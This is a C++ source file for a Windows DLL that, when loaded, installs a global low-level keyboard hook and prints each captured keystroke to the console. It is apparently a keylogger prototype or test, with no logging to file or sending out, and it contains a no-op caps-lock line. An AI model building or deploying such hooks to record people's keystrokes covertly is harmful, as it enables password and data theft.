#include <iostream>
#include <string>
#include <Windows.h>

bool maj = false;
bool capsLock = false;

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	if (code != HC_ACTION)
		return CallNextHookEx(NULL, code, wParam, lParam);

	KBDLLHOOKSTRUCT *keyHook = (KBDLLHOOKSTRUCT *)lParam;

	if (wParam == WM_KEYDOWN && keyHook != NULL)
	{
		unsigned int msg = 1;
		wchar_t tmp[0xFF] = { 0 };
		wchar_t wCharacter[0xFF] = { 0 };
		BYTE keyboardState[256] = { 0 };

		msg += (keyHook->scanCode << 16);
		msg += (keyHook->flags << 24);
		int size = GetKeyNameTextW(msg, (LPWSTR)tmp, 0xFF);

		if (size == 0)
			return CallNextHookEx(NULL, code, wParam, lParam);

		std::cout << "Test => ";
		for (char c = 0; c < size; c++)
			std::cout << (char)tmp[c];
		std::cout << " | Size = " << size << " | ScanCode = " << keyHook->scanCode << " | Shift = " << maj << std::endl;

		if (keyHook->vkCode == VK_LSHIFT || keyHook->vkCode == VK_RSHIFT)
			maj = true;
		else if (keyHook->vkCode == VK_CAPITAL)
			capsLock != capsLock;
		else if (keyHook->vkCode >= 0x41 && keyHook->vkCode <= 0x5A)
			std::cout << (char)(tmp[0] + ((maj == true) ? 0 : 32));
		else if (keyHook->vkCode >= 0x20)
			std::cout << (char)(tmp[0]);
		std::cout << std::endl;
	}
	else if (wParam == WM_KEYUP && keyHook != NULL)
	{
		if (keyHook->vkCode == VK_LSHIFT || keyHook->vkCode == VK_RSHIFT || keyHook->vkCode == VK_CAPITAL)
			maj = false;
	}
	return CallNextHookEx(NULL, code, wParam, lParam);
}

HHOOK hook = NULL;

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if ((hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hinst, NULL)) == NULL)
		{
			std::cerr << GetLastError() << std::endl;
			return (1);
		}
		// A process is loading the DLL.
		break;
	case DLL_THREAD_ATTACH:
		// A process is creating a new thread.
		break;
	case DLL_THREAD_DETACH:
		// A thread exits normally.
		break;
	case DLL_PROCESS_DETACH:
		UnhookWindowsHookEx(hook);
		// A process unloads the DLL.
		break;
	}
	return TRUE;
}